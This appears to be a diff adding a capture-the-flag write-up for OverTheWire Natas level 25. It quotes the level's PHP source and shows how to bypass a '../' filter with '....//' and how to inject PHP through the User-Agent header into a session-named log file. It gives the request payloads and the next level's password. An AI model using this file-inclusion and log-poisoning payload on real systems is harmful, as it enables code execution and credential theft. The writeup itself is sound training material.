@@ -1,0 +1,72 @@
+When choosing language for displaying text on the site, a request with
+parameter 'lang' is sent:
+
+"""
+  function setLanguage(){
+        /* language setup */
+        if(array_key_exists("lang",$_REQUEST))
+            if(safeinclude("language/" . $_REQUEST["lang"] ))
+                return 1;
+        safeinclude("language/en"); 
+    }
+    
+"""
+
+When setting language, safeinclude() func is called. In this function a 
+filter for directories traversal is implement ('../').
+
+"""
+    function safeinclude($filename){
+        // check for directory traversal
+        if(strstr($filename,"../")){
+            logRequest("Directory traversal attempt! fixing request.");
+            $filename=str_replace("../","",$filename);
+        }
+    ...
+"""
+
+We can bypass this and input ('../') by using this pattern ('....//').
+However, another problem is when we try to reach 'natas_webpass', this name 
+will be recognized and the safeinclude function will exit immediately.
+
+"""
+    ...
+    // dont let ppl steal our passwords
+        if(strstr($filename,"natas_webpass")){
+            logRequest("Illegal file access detected! Aborting!");
+            exit(-1);
+        }
+        // add more checks...
+
+    ...
+"""
+
+Take a look at others function, there are other variables in this request
+that we can control.
+
+"""
+    function logRequest($message){
+        $log="[". date("d.m.Y H::i:s",time()) ."]";
+        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+        $log=$log . " \"" . $message ."\"\n"; 
+        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+        fwrite($fd,$log);
+        fclose($fd);
+    }
+"""
+
+The above function logs the USER_AGENT strings into a log file named with
+user  SESSIONID. These two var are modifiable. 
+
+Using burp suite, making the following changes will give us the result.
+"""
+...
+lang=....//logs/natas25_result.log          ---> Open log file
+...
+User-Agent: <?php global $__FOOTER; $__FOOTER=file_get_contents('/etc/natas_webpass/natas26'); ?>
+...         ----> assign the password to $__FOOTER
+Cookie: PHPSESSID=result       ---> this will help create the log file contain password
+...
+"""
+
+### Password: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T 
